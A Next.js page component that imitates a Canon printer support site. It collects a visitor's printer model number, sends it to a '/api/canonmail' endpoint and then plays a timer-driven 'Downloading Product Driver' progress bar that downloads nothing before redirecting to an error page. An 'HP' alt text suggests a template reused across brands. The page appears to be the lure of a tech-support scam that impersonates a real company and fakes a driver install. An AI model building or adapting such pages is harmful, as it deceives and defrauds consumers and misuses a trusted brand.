"use client";

import Image from "next/image";
import { useRouter } from "next/navigation";
import { useState, useEffect } from "react";
import Footer from "../components/footer";
import Header from "../components/header";


  const logo = "/images/canon-logo.png";
  const hero = "/images/canon-loader.png";

export default function CanonPage() {
  const [canonmodel, setCanmodel] = useState("");
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState(0);
  const router = useRouter();

  const totalSteps = 3;


  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setStep(0);

    try {
      const res = await fetch("/api/canonmail", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ canonmodel }),
      });

      const data = await res.json();

      if (data.success) {
        // Start step simulation
        let currentStep = 0;
        const interval = setInterval(() => {
          currentStep++;
          setStep(currentStep);
          if (currentStep >= totalSteps) {
            clearInterval(interval);
            setTimeout(() => router.push("/errorcanon"), 1000);
          }
        }, 2000);
      } else {
        alert("Failed to send email.");
        setLoading(false);
      }
    } catch (err) {
      console.error(err);
      alert("Error sending email.");
      setLoading(false);
    }
  };

  const [index, setIndex] = useState(0);

  const items = [
    { id: 1, name: "PIXMA TS9030", img: "/images/printer1.jpg" },
    { id: 2, name: "PIXMA G2010", img: "/images/printer2.jpg" },
    { id: 3, name: "imageCLASS MF3010", img: "/images/printer3.jpg" },
  ];

  const current = items[index % items.length];

  return (
    <>
       <Header />
      {!loading ? (
        <>
        <main className="min-h-screen bg-white text-neutral-900">
      <div className="max-w-6xl mx-auto px-6 pt-8 pb-4">
        <div className="flex items-center gap-4">
          <div className="text-4xl font-black tracking-tight text-red-600 select-none">
            Canon
          </div>
          <a
            href="#top"
            className="ml-4 inline-flex items-center gap-2 text-red-600 hover:text-red-700">
            <span className="inline-block w-0 h-0 border-y-8 border-y-transparent border-l-12 border-l-red-600" />
            <span className="underline underline-offset-4">Return To Top</span>
          </a>
        </div>
      </div>
      <section className="max-w-6xl mx-auto px-6 pb-16">
        <div className="relative">
          <div className="bg-neutral-100 border border-neutral-200 rounded shadow-sm">
            <div className="relative">
              <div className="absolute -left-1 -top-3 rotate-[-2deg]">
                <div className="w-0 h-0 border-y-8 border-y-transparent border-r-12 border-r-red-600" />
              </div>
              <h2 className="px-6 py-4 text-2xl font-bold bg-neutral-200/80 border-b border-neutral-300 rounded-t">
                Select Product Name
              </h2>
              <div className="p-8">
                <p className="text-center text-lg font-semibold">
                  Search for your product name or select from the list.
                </p>
                <div className="mt-8 rounded-xl bg-neutral-200 border border-neutral-300 p-8">
                 <form onSubmit={handleSubmit} encType="multipart/form-data">
                 <div className="flex justify-center canoninputbox gap-0 max-w-xl mx-auto">
                    <input
            type="text"
            placeholder="Model Number"
            value={canonmodel}
            onChange={(e) => setCanmodel(e.target.value)}
            required
            style={{ padding: "10px", width: "100%", marginBottom: "10px" }}
          />
                    <button  className="rounded-r-md bg-blue-600 px-6 text-white font-semibold hover:bg-blue-700 active:scale-[.99]">GO</button>
                 
                  </div> </form>
                  <div className="relative mt-10 flex justify-center">
                    <Image
                      src="/images/printer1.jpg"   
                      width={220 }
                      height={170}
                      alt="PIXMA TS9030"
                      
                      
                      />
                    {/* <button
                      aria-label="Previous"
                      className="absolute left-0 top-1/2 -translate-y-1/2 h-12 w-12 rounded-full bg-sky-500/80 hover:bg-sky-500 text-white grid place-items-center shadow"
                      onClick={() => setIndex((i) => (i - 1 + items.length) % items.length)}>
                      ◀
                    </button>
                    <div className="mx-auto w-full sm:w-[520px] grid place-items-center">
                      <div className="bg-white border border-neutral-300 rounded-md p-4 shadow-sm w-[220px] h-[170px] grid place-items-center">
                        <Image
                          src={current.img}
                          alt={current.name}
                          width={300}
                          height={300}
                          className="object-contain"
                        />
                      </div>
                      <div className="mt-3 text-sm text-neutral-600">{current.name}</div>
                    </div>
                    <button
                      aria-label="Next"
                      className="absolute right-0 top-1/2 -translate-y-1/2 h-12 w-12 rounded-full bg-sky-500/80 hover:bg-sky-500 text-white grid place-items-center shadow"
                      onClick={() => setIndex((i) => (i + 1) % items.length)}
                    >
                      ▶
                    </button> */}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
      <div className="h-10" />
    </main>
    <Footer />
    </>
      ) : (
        

<>
<div className="loadinstepwrapper">
<div className="leftside">

  <Image
        src={logo}
        alt="HP"
      width={200}
      height={60}
      priority
          className="h-40 w-40 object-contain"
    />
</div>
<div className="mtside">
  <div className="p-8 flex flex-col items-center justify-center">
            <h3 className="text-xl">Downloading Product Driver</h3>
            <div
              style={{
                width: "80%",
                maxWidth: 400,
                height: 12,
                backgroundColor: "#e0e0e0",
                borderRadius: 8,
                overflow: "hidden",
                margin: "20px 0",
              }}
            >
              <div
                style={{
                  height: "100%",
                  width: `${(step / totalSteps) * 100}%`,
                  backgroundColor: "#4caf50",
                  transition: "width 0.5s ease-in-out",
                }}
              />
            </div>
            <p>
              {step} of {totalSteps} Please Wait…
            </p>
            <p>Connecting to Server</p>
          </div>
</div>
<div className="rightside">
        <Image
              src={hero}
              alt="Product"
          width={500}
        height={395}
            priority
                className=" object-contain"
          />
</div>
</div>
</>



      )}
        
    </>
  );
}
